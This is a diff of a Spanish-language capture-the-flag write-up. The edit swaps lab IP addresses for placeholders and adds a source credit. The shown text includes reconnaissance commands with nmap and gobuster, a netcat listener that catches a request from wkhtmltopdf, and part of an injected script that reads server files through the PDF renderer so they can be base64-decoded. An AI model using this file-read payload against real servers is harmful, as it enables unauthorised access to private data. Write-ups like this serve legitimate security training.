@@ -7,13 +7,13 @@ arp-scan -I eth0 --localnet
 ```
 
 ```
-192.168.200.29  08:00:27:7f:36:3d  PCS Systemtechnik GmbH
+(IP-victima)  08:00:27:7f:36:3d  PCS Systemtechnik GmbH
 ```
 
 ### Escaneo de puertos
 
 ```bash
-nmap -p 22,80 -sS -sC -sV  -n -Pn 192.168.200.29 -oN nmap
+nmap -p 22,80 -sS -sC -sV  -n -Pn (IP-victima) -oN nmap
 ```
 
 ```
@@ -39,7 +39,7 @@ Al ingresar al servidor, se observa una imagen de "Volver al futuro" y se deduce
 Ejecutando un escaneo de directorios con `gobuster`:
 
 ```bash
-gobuster dir -u 192.168.200.29 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x .php,.html
+gobuster dir -u (IP-victima) -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x .php,.html
 ```
 
 ```
@@ -72,14 +72,14 @@ nc -nlvp 443
 ```
 
 ```
-connect to [192.168.200.5] from (UNKNOWN) [192.168.200.29] 54372
+connect to [192.168.200.5] from (UNKNOWN) [(IP-victima)] 54372
 GET /prueba.html HTTP/1.1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
 Accept: */*
 Connection: Keep-Alive
 Accept-Encoding: gzip
 Accept-Language: en,*
-Host: 192.168.200.5:443
+Host: (IP-atacante):443
 ```
 
 Ahora podemos interactuar con la máquina víctima.
@@ -104,6 +104,7 @@ Usando un script `<script>` y el archivo .html enviado al servidor mientras escu
     readfile.onerror = function() { document.write('<a>Oops!</a>'); }
 </script>
 ```
+Fuente: [j4ckie0x17](https://j4ckie0x17.gitbook.io/notes-pentesting/pentesting-web/server-side-request-forgery-ssrf)
 
 Guardamos el archivo en base64, luego lo decodificamos:
 
